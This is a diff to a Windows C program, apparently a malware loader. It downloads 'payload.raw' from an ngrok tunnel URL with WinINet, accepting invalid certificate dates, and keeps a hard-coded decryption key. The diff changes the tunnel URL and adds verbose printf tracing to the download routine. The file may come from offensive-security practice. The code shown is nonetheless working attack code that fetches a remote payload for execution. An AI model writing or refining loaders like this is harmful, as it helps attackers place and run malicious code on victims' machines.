@@ -8,7 +8,7 @@
 */
 
 
-const LPCWSTR url = L"https://a9cd809e4481.ngrok-free.app/payload.raw"; 
+const LPCWSTR url = L"https://7ea6af78af29.ngrok-free.app/payload.raw"; 
 const char* key = "rzdhop_is_a_nice_guy";
 size_t sKey = 20;
 
@@ -25,24 +25,28 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
     SIZE_T sSize = 0;
     PBYTE pBytes = NULL, pTmpBytes = NULL;
 
+    printf("[*] Init WinINet session (User-Agent:'rzdhop-agent')\n");
     hInternet = InternetOpenW(L"rzdhop-agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (hInternet == NULL) {
         printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
         bSTATE = FALSE; goto _EndOfFunction;
     }
 
+    printf("[*] Open remote ressource using WinINet session's handle\n");
     hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
     if (hInternetFile == NULL) {
         printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
         bSTATE = FALSE; goto _EndOfFunction;
     }
 
+    printf("[*] Allocating ReadBuff of 1024bytes\n");
     pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
     if (pTmpBytes == NULL) {
         bSTATE = FALSE; goto _EndOfFunction;
     }
 
     while (TRUE) {
+        printf("[*] Reading 1024 bytes\n");
         if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
             printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
             bSTATE = FALSE; goto _EndOfFunction;
@@ -64,6 +68,7 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
         sSize = newSize;
         memset(pTmpBytes, 0, dwBytesRead);
     }
+    printf("[*] Done Reading remote file\n");
 
     *pPayloadBytes = pBytes;
     *sPayloadSize  = sSize;
@@ -156,6 +161,7 @@ int main(int argc, char **argv) {
     PBYTE pPayloadBytes = NULL;
     SIZE_T sPayloadSize = 0;
 
+    printf("[*] Getting Payload from %s", url);
     if (!GetPayloadFromUrl(url, &pPayloadBytes, &sPayloadSize)) {
         printf("[-] Failed to get payload\n");
         return -1;
